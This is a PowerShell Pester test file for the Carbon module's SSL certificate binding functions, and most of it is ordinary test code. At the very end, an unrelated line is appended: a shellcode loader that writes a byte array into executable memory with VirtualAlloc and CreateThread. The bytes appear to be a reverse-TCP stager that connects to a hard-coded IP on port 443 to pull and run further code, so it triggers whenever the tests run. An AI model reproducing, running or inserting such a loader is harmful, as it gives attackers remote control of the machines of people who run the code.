











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'Get-SslCertificateBinding.when getting all bindings' {
    It 'should match netsh output' {
        $output = netsh http show sslcert 
        $output | 
            ForEach-Object {
            
                if( $_ -notmatch '^    (.*)\s+: (.*)$' )
                {
                    return
                }
                
                Write-Debug -Message $_
                $name = $matches[1].Trim()
                $value = $matches[2].Trim()
                
                if( $value -eq '(null)' )
                {
                    $value = ''
                }
                elseif( $value -eq 'Enabled' )
                {
                    $value = $true
                }
                elseif( $value -eq 'Disabled' )
                {
                    $value = $false
                }
                
                if( $name -eq 'IP:port' )
                {
                    if( $value -notmatch '^(.*):(\d+)$' )
                    {
                        Write-Error ('Invalid IP address/port: {0}' -f $value)
                    }
                    else
                    {
                        $ipAddress = $matches[1]
                        $port = $matches[2]
                        $binding = Get-SslCertificateBinding -IPAddress $ipAddress -Port $port
                        $binding.IPAddress | Should -Be ([IPAddress]$ipAddress)
                        $binding.Port | Should -Be $port
                    }
                }
                elseif( $name -eq 'Certificate Hash' )
                {
                    $binding.CertificateHash | Should -Be $value
                }
                elseif( $name -eq 'Application ID' )
                {
                    $binding.ApplicationID | Should -Be ([Guid]$value)
                }
                elseif( $name -eq 'Certificate Store Name' )
                {
                    if( $value -eq '' )
                    {
                        $value = $null
                    }
                    $binding.CertificateStoreName | Should -Be $value
                }
                elseif( $name -eq 'Verify Client Certificate Revocation' )
                {
                    $binding.VerifyClientCertificateRevocation | Should -Be $value
                }
                elseif( $name -eq 'Verify Revocation Using Cached Client Certificate Only' )
                {
                    $binding.VerifyRevocationUsingCachedClientCertificatesOnly | Should -Be $value
                }
                elseif( $name -eq 'Revocation Freshness Time' )
                {
                    $binding.RevocationFreshnessTime | Should -Be $value
                }
                elseif( $name -eq 'URL Retrieval Timeout' )
                {
                    $binding.UrlRetrievalTimeout | Should -Be $value
                }
                elseif( $name -eq 'Ctl Identifier' )
                {
                    $binding.CtlIdentifier | Should -Be $value
                }
                elseif( $name -eq 'Ctl Store Name' )
                {
                    $binding.CtlStoreName | Should -Be $value
                }
                elseif( $name -eq 'DS Mapper Usage' )
                {
                    $binding.DSMapperUsageEnabled | Should -Be $value
                }
                elseif( $name -eq 'Negotiate Client Certificate' )
                {
                    $binding.NegotiateClientCertificate | Should -Be $value
                }
            }
    }
}

Describe 'Get-SslCertificateBinding' {
    
    It 'should get all bindings' {
        $numBindings = netsh http show sslcert |
             Where-Object { $_ -match '^[ \t]+IP:port[ \t]+: (.*)$' } |
             Measure-Object |
             Select-Object -ExpandProperty Count
    
        $bindings = @( Get-SslCertificateBinding )
        $bindings.Length | Should -Be $numBindings
    }
    
    It 'should filter by IP address and port' {
        $foundOne = $false
        $output = netsh http show sslcert 
        $output |
            Where-Object {  $_ -match '^    IP:port\s+: (.*)$' } |
            ForEach-Object {

                if( $foundOne )
                {
                    return
                }
    
                $ipPort = $matches[1].Trim()
                if( $ipPort -notmatch '^(.*):(\d+)$' )
                {
                    Write-Error ('Invalid IP address/port in netsh output: ''{0}''' -f $ipPort )
                    return
                }        
                $ipAddress = $matches[1]
                $port = $matches[2]
                
                $foundOne = $false
                Get-SslCertificateBinding -IPAddress $ipAddress | 
                    ForEach-Object {
                        $_ | Should -Not -BeNullOrEmpty
                        $_.IPAddress | Should -Be ([IPAddress]$ipAddress)
                        $foundOne = $true
                    }
                $foundOne | Should -Be $true
    
                $foundOne = $false                        
                Get-SslCertificateBinding -Port $port |
                    ForEach-Object {
                        $_ | Should -Not -BeNullOrEmpty
                        $_.Port | Should -Be $port.Trim()
                        $foundOne = $true
                    }
                $foundOne | Should -Be $true
            }
    }
    
    It 'should get IPv6 binding' {
        $certPath = Join-Path -Path $PSScriptRoot -ChildPath 'Certificates\CarbonTestCertificate.cer' -Resolve
        $cert = Install-Certificate $certPath -StoreLocation LocalMachine -StoreName My
        $appID = '12ec3276-0689-42b0-ad39-c1fe23d25721'
        Set-SslCertificateBinding -IPAddress '[::]' -Port 443 -ApplicationID $appID -Thumbprint $cert.Thumbprint
    
        try
        {
            $binding = Get-SslCertificateBinding -IPAddress '[::]' | Where-Object { $_.ApplicationID -eq $appID }
            $binding | Should -Not -BeNullOrEmpty
        }
        finally
        {
            Remove-SslCertificateBinding -IPAddress '[::]' -Port 443
        }
    }
    
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0x6d,0x02,0x3f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

